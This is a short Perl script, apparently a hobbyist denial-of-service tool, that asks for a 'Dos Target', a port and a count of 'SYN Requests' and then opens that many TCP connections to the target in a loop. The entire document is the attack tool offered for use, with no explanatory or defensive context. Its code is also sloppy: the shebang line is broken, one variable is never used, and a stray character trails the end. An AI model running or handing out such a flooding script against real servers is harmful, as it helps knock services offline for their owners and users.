!/usr/bin/perl
use IO::Socket;
print q{
Ex: Perl X.pl 127.0.0.1 80 3000
};
if(!defined($ARGV[2])){
print "Dos Target : ";
$host = <STDIN>;
chop ($host);
print "Port : ";
$port = <STDIN>;
chop ($port);
print "SYN Requests to send : ";
$num = <STDIN>;
chop ($num);
}
if(defined($ARGV[2])){
$host = $ARGV[0];
$port = $ARGV[1];
$num = $ARGV[2];
}
for ($i=0; $i<$num; $i++)
{
$len = length $form;
$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort =>
"$port") || die "Can't Connect,It May The Server Dosed?.\n";
syswrite STDOUT, "[*]SYN Request: $i\n";
}
print "\n\nEnd \n\n\n";
print "Press Enter To Exit...";
$end = <STDIN>;
chop ($end); O
